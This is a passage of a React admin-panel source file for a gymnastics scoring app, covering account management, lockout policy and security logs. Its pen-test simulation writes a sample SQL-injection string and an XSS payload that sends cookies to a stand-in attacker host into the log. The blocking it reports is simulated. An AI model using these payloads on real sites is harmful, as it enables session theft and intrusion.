import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  UserPlus, 
  Lock, 
  Trash2, 
  RefreshCw, 
  Unlock, 
  KeyRound, 
  CheckCircle2, 
  AlertTriangle,
  FileCheck2,
  Users,
  Shield,
  Activity,
  Terminal,
  Sliders,
  Skull,
  ShieldCheck,
  Search,
  EyeOff
} from 'lucide-react';
import { Account, SecurityLog } from '../types';
import { generateSalt, hashPassword, logSecurityEvent, getRandomIP } from '../lib/crypto';
import { navigateTo } from '../lib/navigation';
import { ConfirmModal } from '../components/ConfirmModal';

interface SuperadminPageProps {
  onResetSystem?: () => void;
}

export default function SuperadminPage({ onResetSystem }: SuperadminPageProps) {
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [failedAttemptsRecord, setFailedAttemptsRecord] = useState<Record<string, { count: number; lockedUntil: string | null }>>({});
  const [securityLogs, setSecurityLogs] = useState<SecurityLog[]>([]);
  
  // Navigation / Tab state within Superadmin Panel
  const [activeTab, setActiveTab] = useState<'accounts' | 'security-policy'>('accounts');

  // Universal Confirm Modal State
  const [confirmModal, setConfirmModal] = useState<{
    isOpen: boolean;
    title: string;
    message: string;
    onConfirm: () => void;
    variant?: 'danger' | 'warning' | 'primary';
  }>({
    isOpen: false, title: '', message: '', onConfirm: () => {}, variant: 'danger'
  });
  const closeConfirmModal = () => setConfirmModal(prev => ({ ...prev, isOpen: false }));

  // Sinkronisasikan tab aktif dengan URL path (untuk navigasi sidebar pintar)
  useEffect(() => {
    const handlePop = () => {
      const path = window.location.pathname;
      if (path.includes('/security-policy')) {
        setActiveTab('security-policy');
      } else {
        setActiveTab('accounts');
      }
    };
    handlePop();
    window.addEventListener('popstate', handlePop);
    return () => window.removeEventListener('popstate', handlePop);
  }, []);
  
  // Create / Edit Form State
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [role, setRole] = useState<'panitia' | 'juri' | 'peserta'>('peserta');
  const [subRole, setSubRole] = useState<'D' | 'E' | 'Neutral'>('D');
  
  // Editing state
  const [editingAccountId, setEditingAccountId] = useState<string | null>(null);
  const [editPassword, setEditPassword] = useState('');
  
  // Notification State
  const [successMsg, setSuccessMsg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  // Policy Settings state
  const [policyLevel, setPolicyLevel] = useState<'developer' | 'standard' | 'strict' | 'paranoia'>('standard');
  const [globalLock, setGlobalLock] = useState<boolean>(false);
  const [logFilter, setLogFilter] = useState<string>('ALL');
  const [searchTerm, setSearchTerm] = useState<string>('');

  // Security policy definition values mapped
  const POLICY_MAP = {
    developer: { maxAttempts: 15, lockoutDuration: 10, levelName: 'Developer Sandbox' },
    standard: { maxAttempts: 5, lockoutDuration: 30, levelName: 'Standard Balanced' },
    strict: { maxAttempts: 3, lockoutDuration: 90, levelName: 'Strict Secure' },
    paranoia: { maxAttempts: 2, lockoutDuration: 300, levelName: 'Extreme Paranoia' }
  };

  // Load state and configuration from storage
  const loadConfigurationAndAudit = () => {
    try {
      // 1. Accounts
      const storedAcc = localStorage.getItem('gymnascore_accounts');
      if (storedAcc) {
        setAccounts(JSON.parse(storedAcc));
      }
      
      // 2. Failed Lockout states
      const storedAttempts = localStorage.getItem('gymnascore_login_attempts');
      if (storedAttempts) {
        setFailedAttemptsRecord(JSON.parse(storedAttempts));
      }

      // 3. System Global scoring lock
      const storedLock = localStorage.getItem('gymnascore_global_lock');
      setGlobalLock(storedLock === 'true');

      // 4. Security Logs
      const storedLogs = localStorage.getItem('gymnascore_security_logs');
      if (storedLogs) {
        setSecurityLogs(JSON.parse(storedLogs));
      } else {
        // Init initial seed log
        const initialLog = logSecurityEvent(
          'LOGIN_SUCCESS',
          'superadmin',
          'Sesi inisiasi root superadmin berhasil dibuka demi kepatuhan kedaulatan audit',
          'ALLOWED'
        );
        setSecurityLogs([initialLog]);
      }

      // 5. Active policy preference
      const storedPolicy = localStorage.getItem('gymnascore_security_policy');
      if (storedPolicy) {
        const parsed = JSON.parse(storedPolicy);
        const matchedLevel = Object.keys(POLICY_MAP).find(
          key => POLICY_MAP[key as keyof typeof POLICY_MAP].maxAttempts === parsed.maxAttempts
        );
        if (matchedLevel) {
          setPolicyLevel(matchedLevel as any);
        }
      }
    } catch (e) {
      console.error(e);
    }
  };

  useEffect(() => {
    loadConfigurationAndAudit();
    const interval = setInterval(() => {
      // Periodic updates for countdowns and real-time log ingestion
      const attempts = localStorage.getItem('gymnascore_login_attempts');
      if (attempts) setFailedAttemptsRecord(JSON.parse(attempts));
      
      const storedLogs = localStorage.getItem('gymnascore_security_logs');
      if (storedLogs) setSecurityLogs(JSON.parse(storedLogs));
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const triggerNotification = (text: string, isError = false) => {
    if (isError) {
      setErrorMsg(text);
      setSuccessMsg('');
    } else {
      setSuccessMsg(text);
      setErrorMsg('');
    }
    setTimeout(() => {
      setSuccessMsg('');
      setErrorMsg('');
    }, 4500);
  };

  // Create User Account (Sanitized & Hashed)
  const handleCreateAccount = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !fullName.trim()) {
      triggerNotification('Username dan Nama Lengkap wajib diisi!', true);
      return;
    }
    if (password.length < 6) {
      triggerNotification('Password minimal 6 karakter!', true);
      return;
    }

    const sanitizedUsername = username.trim().toLowerCase().replace(/[^a-z0-9_]/g, '');
    
    // Check clean naming pattern
    if (sanitizedUsername !== username.trim().toLowerCase()) {
      triggerNotification('Username hanya boleh berisi huruf, angka, dan underscore.', true);
      return;
    }

    const exists = accounts.some(a => a.username === sanitizedUsername);
    if (exists) {
      triggerNotification(`Username "${sanitizedUsername}" sudah terdaftar di sistem!`, true);
      return;
    }

    const salt = generateSalt();
    const hash = await hashPassword(password, salt);

    const newAcc: Account = {
      id: `acc-${Date.now()}`,
      username: sanitizedUsername,
      passwordHash: hash,
      salt: salt,
      name: fullName.trim(),
      role: role,
      subRole: role === 'juri' ? subRole : undefined,
      createdAt: new Date().toISOString()
    };

    const updated = [...accounts, newAcc];
    localStorage.setItem('gymnascore_accounts', JSON.stringify(updated));
    setAccounts(updated);

    // Write audit event
    logSecurityEvent(
      'ACCOUNT_CREATED',
      'superadmin',
      `Akun baru dibuat secara sah: @${sanitizedUsername} dengan peran ${role.toUpperCase()}${newAcc.subRole ? ` (${newAcc.subRole})` : ''}`,
      'ALLOWED'
    );

    // Refresh logs in view
    const freshLogs = localStorage.getItem('gymnascore_security_logs');
    if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

    // Reset Form
    setUsername('');
    setPassword('');
    setFullName('');
    setRole('peserta');
    
    triggerNotification(`Berhasil mendaftarkan akun @${sanitizedUsername} (${role.toUpperCase()}).`);
  };

  // Change Password securely
  const handleUpdatePassword = async (accountId: string, usernameKey: string) => {
    if (editPassword.length < 6) {
      triggerNotification('Password baru minimal 6 karakter!', true);
      return;
    }

    setConfirmModal({
      isOpen: true,
      title: 'Ubah Kata Sandi',
      message: `Apakah Anda yakin ingin mengubah kata sandi untuk akun @${usernameKey}?`,
      variant: 'warning',
      onConfirm: async () => {
        closeConfirmModal();
        const salt = generateSalt();
        const hash = await hashPassword(editPassword, salt);

        const updated = accounts.map(a => {
          if (a.id === accountId) {
            return {
              ...a,
              passwordHash: hash,
              salt: salt
            };
          }
          return a;
        });

        localStorage.setItem('gymnascore_accounts', JSON.stringify(updated));
        setAccounts(updated);

        // Log Password modification
        logSecurityEvent(
          'PASSWORD_CHANGED',
          'superadmin',
          `Mereset dan merekonstruksi salt sandi untuk user @${usernameKey}`,
          'ALLOWED'
        );

        const freshLogs = localStorage.getItem('gymnascore_security_logs');
        if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

        setEditingAccountId(null);
        setEditPassword('');
        triggerNotification(`Kata sandi akun @${usernameKey} berhasil diubah.`);
      }
    });
  };

  // Delete User with safety constraints
  const handleDeleteAccount = (acc: Account) => {
    if (acc.username === 'superadmin') {
      triggerNotification('Akun Superadmin utama tidak dapat dihapus.', true);
      return;
    }

    setConfirmModal({
      isOpen: true,
      title: 'Hapus Akun',
      message: `Apakah Anda yakin ingin menghapus akun @${acc.username}? Akun yang dihapus tidak dapat dipulihkan.`,
      variant: 'danger',
      onConfirm: () => {
        closeConfirmModal();
        const updated = accounts.filter(a => a.id !== acc.id);
        localStorage.setItem('gymnascore_accounts', JSON.stringify(updated));
        setAccounts(updated);

        // Lock tracking delete
        try {
          const attempts = localStorage.getItem('gymnascore_login_attempts') || '{}';
          const parsed = JSON.parse(attempts);
          if (parsed[acc.username]) {
            delete parsed[acc.username];
            localStorage.setItem('gymnascore_login_attempts', JSON.stringify(parsed));
            setFailedAttemptsRecord(parsed);
          }
        } catch (e) {}

        // Log Account Deletion
        logSecurityEvent(
          'ACCOUNT_DELETED',
          'superadmin',
          `Mendelegasikan perintah penghapusan user @${acc.username} (${acc.role.toUpperCase()}) dari database sirkuit`,
          'ALLOWED'
        );

        const freshLogs = localStorage.getItem('gymnascore_security_logs');
        if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

        triggerNotification(`Akun @${acc.username} berhasil dihapus.`);
      }
    });
  };

  // Unlock and unblock user manually
  const handleUnlockAccount = (usernameKey: string) => {
    const freshAttempts = { ...failedAttemptsRecord };
    delete freshAttempts[usernameKey];
    localStorage.setItem('gymnascore_login_attempts', JSON.stringify(freshAttempts));
    setFailedAttemptsRecord(freshAttempts);

    // Write audit event
    logSecurityEvent(
      'UNLOCKED',
      usernameKey,
      `Superadmin melepaskan blokir IP & setel ulang kegagalan login kembali ke nol`,
      'UNBLOCKED'
    );

    const freshLogs = localStorage.getItem('gymnascore_security_logs');
    if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

    triggerNotification(`Blokir login untuk @${usernameKey} berhasil dibuka.`);
  };

  // Alter Security Level Policies
  const handlePolicyChange = (level: keyof typeof POLICY_MAP) => {
    const selectedPolicy = POLICY_MAP[level];
    localStorage.setItem('gymnascore_security_policy', JSON.stringify(selectedPolicy));
    setPolicyLevel(level);

    logSecurityEvent(
      'GLOBAL_LOCK_TOGGLED',
      'superadmin',
      `Merubah kebijakan Brute-Force ke level [${selectedPolicy.levelName.toUpperCase()}] (${selectedPolicy.maxAttempts} kali batas, lockout ${selectedPolicy.lockoutDuration}s)`,
      'MODIFIED'
    );

    const freshLogs = localStorage.getItem('gymnascore_security_logs');
    if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

    triggerNotification(`Kebijakan keamanan diubah ke level ${selectedPolicy.levelName}.`);
  };

  // Global Arena Score Submission lock toggling
  const handleToggleGlobalLock = () => {
    const nextState = !globalLock;
    localStorage.setItem('gymnascore_global_lock', nextState ? 'true' : 'false');
    setGlobalLock(nextState);

    logSecurityEvent(
      'GLOBAL_LOCK_TOGGLED',
      'superadmin',
      nextState 
        ? 'MENGAKTIFKAN LOCKDOWN SIRKUIT: Seluruh wasit & juri dibekukan dari otorisasi kirim nilai' 
        : 'MENORMALKAN KONDISI: Otorisasi kirim nilai wasit dilepas kembali ke mode tanding',
      nextState ? 'LOCKED' : 'RELEASED'
    );

    const freshLogs = localStorage.getItem('gymnascore_security_logs');
    if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));

    triggerNotification(
      nextState 
        ? 'Seluruh input skor dari juri berhasil dibekukan sementara.'
        : 'Sirkuit kembali normal. Juri dapat mengirim nilai kembali.'
    );
  };

  // Cyber attack penetration testing simulation
  const handleSimulatePenTest = (type: 'SQLi' | 'XSS' | 'Brute') => {
    const attackerIP = getRandomIP();

    if (type === 'SQLi') {
      const payload = "peserta' OR '1'='1' --";
      logSecurityEvent(
        'CYBER_ATTACK_SIMULATION',
        'anonymous',
        `DETECTED: Percobaan injeksi karakter SQL-Injection payload: [${payload}] pada formulir credentials`,
        'BLOCKED',
        attackerIP
      );
      triggerNotification('Simulasi Berhasil: Deteksi SQL Injection.', false);
    } 
    else if (type === 'XSS') {
      const payload = "<script>fetch('http://serverhacker.com/steal?cookie='+document.cookie)</script>";
      logSecurityEvent(
        'CYBER_ATTACK_SIMULATION',
        'anonymous',
        `DETECTED: Percobaan injeksi Cross-Site Scripting (XSS) payload: [${payload}] diredam oleh engine sanitasi`,
        'SANITIZED',
        attackerIP
      );
      triggerNotification('Simulasi Berhasil: Deteksi XSS.', false);
    } 
    else if (type === 'Brute') {
      const testUser = 'jurie';
      logSecurityEvent(
        'CYBER_ATTACK_SIMULATION',
        testUser,
        `INTENSIVE ATTACK: Kamus kata sandi otomatis (Dictionary scraper brute-force) meluncurkan 5 request berturut-turut`,
        'BLOCKED',
        attackerIP
      );
      
      // Force trigger lockout on the test user to show it in UI!
      const attemptsStr = localStorage.getItem('gymnascore_login_attempts') || '{}';
      const attempts = JSON.parse(attemptsStr);
      const lockedUntilDate = new Date(Date.now() + (POLICY_MAP[policyLevel].lockoutDuration * 1000));
      attempts[testUser] = {
        count: POLICY_MAP[policyLevel].maxAttempts,
        lockedUntil: lockedUntilDate.toISOString()
      };
      localStorage.setItem('gymnascore_login_attempts', JSON.stringify(attempts));
      setFailedAttemptsRecord(attempts);

      logSecurityEvent(
        'LOCKOUT',
        testUser,
        `Sistem menghentikan ancaman dengan memberlakukan lock IP untuk user @${testUser}`,
        'FORCE_BLOCKED',
        attackerIP
      );

      triggerNotification(`Simulasi Berhasil: Deteksi Brute Force pada akun @${testUser}.`, false);
    }

    const freshLogs = localStorage.getItem('gymnascore_security_logs');
    if (freshLogs) setSecurityLogs(JSON.parse(freshLogs));
  };

  const handleClearAuditLogs = () => {
    setConfirmModal({
      isOpen: true,
      title: 'Kosongkan Riwayat Log',
      message: 'Apakah Anda yakin ingin menghapus seluruh log aktivitas? Data yang dihapus tidak dapat dikembalikan.',
      variant: 'danger',
      onConfirm: () => {
        closeConfirmModal();
        const remainingLog = logSecurityEvent(
          'SYSTEM_RESET',
          'superadmin',
          'Wiping security event logs permanently. Initiated raw console reload.',
          'PURGED'
        );
        setSecurityLogs([remainingLog]);
        triggerNotification('Security log berhasil dibersihkan.');
      }
    });
  };

  // Filter application security logs based on filter mode
  const getFilteredLogs = () => {
    let list = [...securityLogs];
    
    if (logFilter !== 'ALL') {
      if (logFilter === 'FAILURES') {
        list = list.filter(l => l.eventType === 'LOGIN_FAILED' || l.eventType === 'LOCKOUT' || l.eventType === 'CYBER_ATTACK_SIMULATION');
      } else if (logFilter === 'ADMIN') {
        list = list.filter(l => l.eventType === 'ACCOUNT_CREATED' || l.eventType === 'ACCOUNT_DELETED' || l.eventType === 'PASSWORD_CHANGED' || l.eventType === 'GLOBAL_LOCK_TOGGLED' || l.eventType === 'UNLOCKED');
      }
    }

    if (searchTerm.trim()) {
      const query = searchTerm.toLowerCase();
      list = list.filter(l => 
        l.username.toLowerCase().includes(query) || 
        l.details.toLowerCase().includes(query) || 
        l.action.toLowerCase().includes(query) ||
        l.ipAddress.includes(query)
      );
    }

    return list;
  };

  const filteredLogs = getFilteredLogs();

  return (
    <div id="superadmin-panel-container" className="space-y-8 w-full max-w-7xl mx-auto select-none">
      
      {/* UNIVERSAL CONFIRM MODAL */}
      <ConfirmModal
        isOpen={confirmModal.isOpen}
        title={confirmModal.title}
        message={confirmModal.message}
        onConfirm={confirmModal.onConfirm}
        onCancel={closeConfirmModal}
        variant={confirmModal.variant}
      />
      
      {/* HEADER BANNER SECURE ZONE */}
      <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 text-white rounded-3xl p-6 sm:p-8 shadow-md border border-slate-800 relative overflow-hidden">
        <div className="absolute top-1/2 right-12 -translate-y-1/2 w-[300px] h-[300px] bg-indigo-500/10 rounded-full blur-[70px] pointer-events-none"></div>
        <div className="max-w-4xl relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-indigo-500/30 text-indigo-300 border border-indigo-400">
                Pusat Pengelolaan Akun & Kredensial Keamanan
              </span>
              <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-purple-500/20 text-purple-300 border border-purple-500/40">
                Hak Akses: Superadmin Utama
              </span>
            </div>
            <h2 className="text-xl sm:text-2xl font-display font-black tracking-tight flex items-center gap-2 uppercase">
              🛡️ Panel Kontrol Keamanan (GymnaScore)
            </h2>
            <p className="text-2xs sm:text-xs text-slate-300 font-medium leading-relaxed max-w-2xl">
              Melalui laman ini, Anda dapat mengawasi keamanan data, mengelola hashing kata sandi SHA-256 juri dan panitia, memproteksi sistem dari percobaan retas, serta melakukan pembekuan darurat (lockdown) pada semua input skor wasit.
            </p>
          </div>
          
          {/* Quick Stats Block inside banner */}
          <div className="flex gap-4 shrink-0 font-mono text-center">
            <div className="bg-white/10 px-3.5 py-2 rounded-2xl border border-white/10">
              <div className="text-xl font-black text-white">{accounts.length}</div>
              <div className="text-[8px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">Total Akun</div>
            </div>
            <div className="bg-white/10 px-3.5 py-2 rounded-2xl border border-white/10">
              <div className="text-xl font-black text-rose-400">
                {(Object.values(failedAttemptsRecord) as Array<{ count: number; lockedUntil: string | null }>).filter(v => v.lockedUntil && new Date(v.lockedUntil) > new Date()).length}
              </div>
              <div className="text-[8px] text-rose-350 font-bold uppercase tracking-wider mt-0.5">Akun Terkunci</div>
            </div>
          </div>
        </div>
      </div>

      {errorMsg && (
        <div className="bg-rose-50 border border-rose-200 text-rose-800 p-4 rounded-2xl flex items-center gap-2.5 text-xs font-semibold animate-shake">
          <AlertTriangle className="w-5 h-5 text-rose-600 shrink-0" />
          <span>{errorMsg}</span>
        </div>
      )}

      {successMsg && (
        <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 p-4 rounded-2xl flex items-center gap-2.5 text-xs font-semibold">
          <CheckCircle2 className="w-5 h-5 text-emerald-500 shrink-0" />
          <span>{successMsg}</span>
        </div>
      )}

      {/* RENDERING TAB CONTENT */}
      {activeTab === 'accounts' ? (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* MAIN FORM: CREATE ACCOUNTS */}
          <div className="lg:col-span-1 space-y-6">
            <div className="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-xs space-y-5">
              <div className="flex items-center gap-2 border-b border-slate-100 pb-3">
                <UserPlus className="w-5 h-5 text-indigo-600" />
                <h3 className="font-display font-black text-xs sm:text-sm text-slate-900 uppercase">
                  Registrasi Kredensial Baru
                </h3>
              </div>

              <form onSubmit={handleCreateAccount} className="space-y-4">
                <div className="space-y-1">
                  <label className="text-[10px] uppercase font-mono font-bold text-slate-400 block">Username Login</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="e.g. juri_lantai, panitia_bali"
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl py-2.5 px-3 text-xs font-semibold text-slate-900 focus:bg-white focus:outline-none focus:border-indigo-600 transition-all font-mono"
                  />
                  <p className="text-[9px] text-slate-400 font-mono leading-tight">Menerima karakter lowercase, angka, dan underscore saja.</p>
                </div>

                <div className="space-y-1">
                  <label className="text-[10px] uppercase font-mono font-bold text-slate-400 block">Nama Lengkap Anggota</label>
                  <input
                    type="text"
                    required
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    placeholder="e.g. Prof. Hendra Wijaya, M.Pd"
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl py-2.5 px-3 text-xs font-semibold text-slate-900 focus:bg-white focus:outline-none focus:border-indigo-600 transition-all"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-[10px] uppercase font-mono font-bold text-slate-400 block">Kata Sandi Default</label>
                  <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Sandi minimal 6 karakter..."
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl py-2.5 px-3 text-xs font-semibold text-slate-900 focus:bg-white focus:outline-none focus:border-indigo-600 transition-all font-mono"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-[10px] uppercase font-mono font-bold text-slate-400 block">Hak Akses Sistem (Role)</label>
                  <select
                    value={role}
                    onChange={(e: any) => setRole(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl py-2.5 px-3 text-xs font-semibold text-slate-905 text-slate-800 focus:bg-white focus:outline-none focus:border-indigo-600 transition-all"
                  >
                    <option value="peserta">Portal Atlet / Kontingen Daerah</option>
                    <option value="panitia">Panitia Pelaksana (Official / Staff)</option>
                    <option value="juri">Majelis Wasit / Juri Gelanggang</option>
                  </select>
                </div>

                {role === 'juri' && (
                  <div className="space-y-1.5 bg-rose-50/50 p-3.5 rounded-xl border border-rose-100 animate-fadeIn">
                    <label className="text-[9px] uppercase font-mono font-bold text-rose-700 block">Sub-Panel FIG Kompetensi</label>
                    <select
                      value={subRole}
                      onChange={(e: any) => setSubRole(e.target.value)}
                      className="w-full bg-white border border-rose-200 rounded-xl py-2 px-3 text-xs font-bold text-slate-900 focus:outline-none focus:border-rose-500 transition-all"
                    >
                      <option value="D">Wasit D-Score (Kesulitan Elemen)</option>
                      <option value="E">Wasit E-Score (Kerapian Eksekusi)</option>
                      <option value="Neutral">Wasit Neutral (Time & Out of Line)</option>
                    </select>
                    <p className="text-[9px] text-rose-600 font-mono leading-tight">Oposisi panel menentukan komponen penilaian terenkripsi di sirkuit tanding.</p>
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-mono font-black py-3 px-4 rounded-xl text-3xs tracking-widest cursor-pointer transition-all flex items-center justify-center gap-1.5 shadow-sm shadow-indigo-650/15"
                >
                  ➕ REGISTER AKUN DI SIRKUIT
                </button>
              </form>
            </div>

            {/* Quick Brute tips */}
            <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-3 font-mono text-[10px] text-slate-500 leading-normal font-semibold">
              <span className="text-slate-850 font-black uppercase text-xs block mb-1">Pedoman Hak Akses:</span>
              <p>Mencegah intersept kredensial palsu: pastikan nama lengkap didaftarkan persis di sertifikat organisasi KONI/PERSANI daerah.</p>
            </div>
          </div>

          {/* ACTIVE DIRECTORY & ACCOUNT SEED */}
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-white border border-slate-200 rounded-3xl p-5 sm:p-6 shadow-xs space-y-6">
              
              <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-slate-100 pb-4 gap-3">
                <div className="flex items-center gap-2">
                  <Users className="w-5 h-5 text-indigo-600" />
                  <h3 className="font-display font-black text-xs sm:text-sm text-slate-900 uppercase">
                    Direktori Kredensial Hashed ({accounts.length})
                  </h3>
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={loadConfigurationAndAudit}
                    className="text-slate-650 hover:text-slate-800 px-3 py-1.5 border border-slate-200 rounded-xl hover:bg-slate-50 transition-all cursor-pointer font-mono text-[10px] font-bold flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" /> Refresh Kredensial
                  </button>
                </div>
              </div>

              {/* LIST DIRECTORY TABLE */}
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-slate-200 bg-slate-50 text-2xs font-mono font-bold text-slate-450 uppercase">
                      <th className="py-3 px-4">Username & Profil Resmi</th>
                      <th className="py-3 px-3">Role</th>
                      <th className="py-3 px-3">Sub-Wasit</th>
                      <th className="py-3 px-3">Brute Lock IP</th>
                      <th className="py-3 px-4 text-right">Manajemen</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-150">
                    {accounts.map(acc => {
                      const lockoutInfo = failedAttemptsRecord[acc.username];
                      const isLocked = lockoutInfo && lockoutInfo.lockedUntil && new Date(lockoutInfo.lockedUntil) > new Date();
                      const secondsLeft = isLocked ? Math.max(0, Math.round((new Date(lockoutInfo.lockedUntil!).getTime() - Date.now()) / 1000)) : 0;

                      return (
                        <tr key={acc.id} className="hover:bg-slate-50/55 text-xs text-slate-800 font-semibold">
                          
                          <td className="py-4 px-4">
                            <div className="min-w-[170px]">
                              <div className="font-mono text-slate-905 font-bold text-xs text-indigo-700">@{acc.username}</div>
                              <div className="text-2xs text-slate-500 font-sans">{acc.name}</div>
                            </div>
                          </td>

                          <td className="py-4 px-3">
                            <span className={`px-2 py-0.5 rounded text-[8px] font-mono font-extrabold uppercase ${
                              acc.role === 'superadmin' ? 'bg-indigo-50 text-indigo-805 border border-indigo-200' :
                              acc.role === 'panitia' ? 'bg-amber-50 text-amber-805 border border-amber-200' :
                              acc.role === 'juri' ? 'bg-rose-50 text-rose-805 border border-rose-200' :
                              'bg-cyan-50 text-cyan-805 border border-cyan-200'
                            }`}>
                              {acc.role}
                            </span>
                          </td>

                          <td className="py-4 px-3 font-mono text-2xs text-slate-500">
                            {acc.subRole ? `Wasit ${acc.subRole}` : '-'}
                          </td>

                          <td className="py-4 px-3">
                            {isLocked ? (
                              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[8px] font-mono font-black bg-rose-100 text-rose-800 border border-rose-300 animate-pulse">
                                🔒 BLOCKED ({secondsLeft}s)
                              </span>
                            ) : (
                              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[8px] font-mono font-black bg-emerald-100 text-emerald-800 border border-emerald-300">
                                🟢 AMAN / LIVE
                              </span>
                            )}
                          </td>

                          <td className="py-4 px-4 text-right">
                            <div className="flex items-center justify-end gap-2">
                              {/* Unlock manual action */}
                              {isLocked && (
                                <button
                                  onClick={() => handleUnlockAccount(acc.username)}
                                  className="px-2 py-1 bg-emerald-50 hover:bg-emerald-100/80 border border-emerald-200 rounded-lg text-emerald-700 cursor-pointer text-[10px] font-mono font-black flex items-center gap-0.5 transition-all text-xs"
                                >
                                  <Unlock className="w-3 h-3" /> Lepas Blokir
                                </button>
                              )}

                              {/* Edit password flow */}
                              {editingAccountId === acc.id ? (
                                <div className="flex items-center gap-1.5 bg-slate-50 border border-slate-200 p-2 rounded-xl animate-fadeIn absolute z-20">
                                  <input
                                    type="password"
                                    placeholder="Sandi baru..."
                                    value={editPassword}
                                    onChange={(e) => setEditPassword(e.target.value)}
                                    className="p-1 border border-slate-300 rounded text-xs w-32 focus:outline-none font-mono"
                                  />
                                  <button
                                    onClick={() => handleUpdatePassword(acc.id, acc.username)}
                                    className="p-1 px-2 bg-slate-950 text-white rounded font-mono text-[9px] font-bold hover:bg-slate-800"
                                  >
                                    Konfirmasi
                                  </button>
                                  <button
                                    onClick={() => setEditingAccountId(null)}
                                    className="p-1 text-slate-500 hover:text-slate-700 text-[10px]"
                                  >
                                    Batal
                                  </button>
                                </div>
                              ) : (
                                <button
                                  onClick={() => {
                                    setEditingAccountId(acc.id);
                                    setEditPassword('');
                                  }}
                                  title="Ubah Sandi"
                                  className="p-1.5 bg-slate-100 border border-slate-250 rounded-lg hover:bg-slate-200 text-slate-650 transition-all cursor-pointer font-bold text-3xs flex items-center gap-1"
                                >
                                  <KeyRound className="w-3.5 h-3.5" /> Ubah Sandi
                                </button>
                              )}

                              {/* Delete Account */}
                              <button
                                onClick={() => handleDeleteAccount(acc)}
                                disabled={acc.username === 'superadmin'}
                                className={`p-1.5 rounded-lg border transition-all cursor-pointer ${
                                  acc.username === 'superadmin' 
                                    ? 'opacity-30 cursor-not-allowed border-slate-200 text-slate-305' 
                                    : 'border-rose-200 hover:bg-rose-50 text-rose-600'
                                }`}
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </td>

                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>

              {/* RECOVERY CORNER */}
              <div className="bg-slate-50 border border-slate-200 p-4 rounded-2xl flex flex-col sm:flex-row items-center justify-between gap-3 text-2xs font-mono text-slate-500 font-semibold leading-relaxed">
                <div className="flex items-center gap-2">
                  <FileCheck2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>Atur Ulang Penuh: Bersihkan relasi database & reset akun-akun tanding kembali ke standard FIG.</span>
                </div>
                <button
                  onClick={() => {
                    setConfirmModal({
                      isOpen: true,
                      title: 'Reset Sistem',
                      message: 'Peringatan: Opsi ini akan menghapus semua akun, pengaturan alat, nilai peserta, dan log aktivitas. Sistem akan kembali ke pengaturan awal. Apakah Anda yakin ingin melanjutkan?',
                      variant: 'danger',
                      onConfirm: () => {
                        closeConfirmModal();
                        if (onResetSystem) onResetSystem();
                      }
                    });
                  }}
                  className="px-3.5 py-2 bg-rose-50 text-rose-700 hover:bg-rose-100 border border-rose-200 rounded-lg font-bold font-mono transition-all text-xs cursor-pointer uppercase shrink-0"
                >
                  Factory Reset Database & Kredensial
                </button>
              </div>

            </div>
          </div>

        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* POLICIES PANEL */}
          <div className="lg:col-span-1 space-y-6">
            
            {/* POLICY STRENGTH LEVEL */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4">
              <div className="flex items-center gap-2 border-b border-slate-100 pb-3">
                <Sliders className="w-5 h-5 text-indigo-600" />
                <h3 className="font-display font-black text-xs sm:text-sm text-slate-900 uppercase">
                  Konfigurasi Proteksi Brute-Force
                </h3>
              </div>
              <p className="text-2xs text-slate-500 font-semibold">
                Tentukan sensitivitas limit kegagalan sandi (API/UI Lockout duration) sebelum IP dibekukan otomatis oleh sirkuit.
              </p>

              <div className="space-y-2.5 pt-2">
                {(Object.keys(POLICY_MAP) as Array<keyof typeof POLICY_MAP>).map((key) => {
                  const p = POLICY_MAP[key];
                  const isCurrent = key === policyLevel;
                  return (
                    <button
                      key={key}
                      onClick={() => handlePolicyChange(key)}
